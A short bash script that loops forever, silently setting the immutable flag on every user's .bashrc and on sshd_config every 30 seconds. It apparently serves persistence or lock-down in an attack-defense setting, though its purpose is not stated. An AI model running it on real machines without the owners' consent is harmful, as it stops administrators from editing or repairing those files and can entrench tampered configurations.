#!/bin/bash

# Function to apply chattr to a file
apply_chattr() {
    file=$1
    chattr +i "$file"
    if [ $? -eq 0 ]; then
        echo "chattr applied successfully to $file" > /dev/null
    fi
}

while true; do
    # Get list of all user directories under /home
    user_directories=$(ls -l /home | grep '^d' | awk '{print $9}')

    # Loop through each user directory and apply chattr to .bashrc file
    for user_dir in $user_directories; do
        bashrc_file="/home/$user_dir/.bashrc"
        if [ -f "$bashrc_file" ]; then
            apply_chattr "$bashrc_file"
        fi
    done

    # Apply chattr to /etc/ssh/sshd_config
    sshd_config="/etc/ssh/sshd_config"
    if [ -f "$sshd_config" ]; then
        apply_chattr "$sshd_config"
    fi

    sleep 30
done